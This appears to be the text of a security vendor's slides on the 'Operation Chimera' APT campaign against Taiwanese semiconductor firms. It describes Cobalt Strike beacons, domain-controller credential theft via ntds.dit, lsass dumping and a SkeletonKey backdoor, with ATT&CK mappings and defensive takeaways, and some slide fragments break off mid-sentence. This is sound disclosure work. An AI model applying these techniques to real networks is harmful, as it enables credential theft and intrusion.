Taiwan's Importance in the
Semiconductor Landscape
► With decades of development, Taiwan has established itself as a leading player in the
semiconductor industry. Some of the well-known leaders include TSMC and MTK

• “Taiwan is set to become the largest and fastest-growing semiconductor equipment maker in the
world by increasing by 21.1 percent to reach US$12.31 billion.” -Taiwan News, July 2019

Cyberattack to semiconductor vendors
v Just like the TSMC ransomware, a cyberattack against semiconductor could
potentially
v Seriously impact Taiwan’s economy
v Affect the entire global supply chain

v In this report, we will show how IT attacks on semiconductor vendors can be just as
dangerous as an OT attack.
v Attack to OT - production line halt, immediately damage
v Attack to IT - leak important intelligence property, long-term damage

Large-scale APT attacks on
Semiconductor Industry
Vendors located at the Hsinchu Science Park(HSP) were targeted

Between 2018 and 2019, we discovered several attacks on semiconductor vendors
Extensive attack: > 7 semiconductor vendors were attacked

After our white paper was published, the received feedback revealed that more than 7
vendors were targeted by the same threat actor
Not a single point attack, but an attack on the entire industry
surface

The APT attacks on the important vendors were precise and well-coordinated. Aside from
the vendors themselves, their subsidiaries, and competitors were all targeted

Group Chimera
►As the activities, attack techniques,

and tactics were similar, we believe
this was the work of the same threat
actor

►Target: Semiconductor Vendors
►Malware: Merged different Open

• Our long-term partner. The longterm monitoring allowed more
details of the attacker's activities
to be revealed.
• The detailed information enabled
us to track the root cause.

• One-time IR service. When the
investigation started, it was
already a long time after the
attacks happened.
• Highlighted the threat actor’s
long-term activities and what data
was leaked.

• Long-term partner with high
security capacity.
• Help us to deep investigate, get a
lot feedback from them
• Give us more information to

Ø

15 endpoints and 6 user accounts were
compromised
Ø Note that all the names are de-identified

Ø

Four malwares and eight C2 servers were
found

Cobalt Strike
►Disguised Cobalt Strike beacon as Google Update.exe
►VT search found nothing
►Injected payloads into other processes

►Found in two endpoints: Server-LAUREN & PC-SHENNA

CyCraft Proprietary and Confidential Information

Used Hosting Server for C2
►Network security devices had difficulty detecting the associated C2 servers, as they
were in the Google Cloud Platform.

►Created backdoor which was disguised as Google Update.
►Other cloud hosting services were also abused

CyCraft Proprietary and Confidential Information

Root Cause Analysis - PC-SHENNA
►With our Timeline Analysis, we found that the backdoor in PC-SHENNA was
implanted from Server-LAUREN

Attack was launched right before

►Due to our new findings, additional
information could be added to our
investigation graph

ServerSHANAE

ServerMELINA

CyCraft Proprietary and Confidential Information

PC-SHENNA

Root Cause Analysis - Server-LAUREN
►Server-LAUREN remotely used an archive tool to collect registry and ntds.dit in
Server-MELINA(DC) for offline breaking

CyCraft Proprietary and Confidential Information

NTDS.DIT Explanation
►Active Directory data was stored in the ntds.dit ESE database file. Two copies of
ntds.dit were present in separate locations on a given domain controller.

►%SystemRoot%\NTDS\ntds.dit
►%SystemRoot%\System32\ntds.dit

ntds.dit is the AD database, containing domain hosts and users information(e.g. ID,
name, email and password). As ntds.dit was encrypted, and the key was stored I the
SYSTEM registry, the adversary also needed to make a copy of the registry data.

CyCraft Proprietary and Confidential Information

Root Cause Analysis - NB-CLAIR
►Through correlation analysis, our AI investigation
showed that NB-CLAIR used Schedule Task to place
malware to the schedule tasks of Server-LAUREN

PCSHENNA

Root Cause Analysis - NB-CLAIR
►In the NB-CLAIR timeline, we discovered six minutes before the scheduled task
execution, IP1 used RDP and User-01 to make a successful login

►This is highly likely to be the root cause of the attack

CyCraft Proprietary and Confidential Information

Recon
►Several "net user" commands were executed
for recon purposes, and the results were
saved to the RecordedTV_lib.log

CyCraft Proprietary and Confidential Information

Data Exfiltration
►RECORDEDTV.MS was used to archive the stolen data for data exfiltration

►Identical binaries were found in several machines, but under different names, e.g.
RECORDEDTV.MS, uncheck.dmp, and jucheck.exe

►RAR software, had a one-byte discrepancy from the original version

►The same file was also found on other machines. Thus, it is likely to have been used
in past attacks

►Inserting malware in a location, where legal software is stored, seems to be a
characteristic tactic of Operation Chimera

CyCraft Proprietary and Confidential Information

Root Cause Analysis– IP1
►IP1 is a unscanned host and related to many accounts. It could be a shared machine
or a VPN host

►VPN can also be compromised. Never use VPN as your only line of defense

SkeletonKey Injector

SkeletonKey Injector
►A new malware combined "dumpert" and "mimikatz"
►"mimikatz" is a well-known hacking tool
l

Most people use it to dump Windows credentials, but its capability is more than that

►"dumpert" is a tool to dump lsass.exe memory stealthily

CyCraft Proprietary and Confidential Information

Dumpert
►Made by a security company called Outflank
►Dump lsass.exe stealthy via direct system call
►Windows system call numbers changed from release to release
►DLL export function is the only stable interface
►That's why Windows shellcode always needs to locate DLLs in memory

CyCraft Proprietary and Confidential Information

Dumpert: Implementation
►Use ntdll!RtlGetVerion to determine Windows version
►Load different syscall function for different version
►Bypass any user-space hook

CyCraft Proprietary and Confidential Information

SkeletonKey
►APT malware discovered by DELL Secureworks in 2015
►Implants a backdoor password to domain controller

►The original password was still valid, wrong password still got rejected

►Inject code into lsass.exe process to alter authentication routine

CyCraft Proprietary and Confidential Information

Impact of SkeletonKey Injector
►No need to use administrator credentials for lateral movement
►It leaves nearly no clue, only logon success events
►You must reboot domain controller to clean the SkeletonKey
►We've observed some other attack that using modified mimikatz

Take Away
►Disclosure a large-scale APT attacks targeting semiconductor; more
than 7 vendors are compromised.

►Precisely attacks. Targets leading semiconductor vendors, their
subsidiaries, partners and competitors.

►Their goals is stealing intelligence property(documents, source code,
SDK of chip related projects). Make long-term damage to the victim.

CyCraft Proprietary and Confidential Information

Take Away
►Attackers utilize varies open source, general tools to make attribution
harder.

►In 2 shared case studies, AD & VPN are compromised. Enterprises
should consider resilience of IT systems. Avoid relying on a single
security service.

►A rarely used SkeletonKey technique is used, which makes

adversaries login like normal user. - Persistence, Defense Evasion.

►No system is safe. Regularly threat hunting, shorten the MTTD/MTTR.

Description

T1133

External Remote Services

The threat actor’s first entry point was from a VPN server, where
a valid account was used. We believe the actor acquired the
password from a separate data breach to login to the VPN.

T1047

Windows Management
Instrumentation

The threat actor used wmi to remotely execute commands on
another endpoint for reconnaissance, primarily checking the
Internet connection availability.

Powershell

The threat actor used a Cobalt Strike powershell script for
process migration to other system processes. Meanwhile,
BloodHound was used to assess the privilege settings in the
Active Directory (AD) domain and devise attack paths.

T1053

Scheduled Task

The threat actor leveraged scheduled tasks to launch APT
malware to a remote system using domain controller account
credentials. After the execution, the threat actor removed the
scheduled task information to hide the system artifact.

The discovered memory module showed that Cobalt Strike
conducted process injection to migrate to other processes.
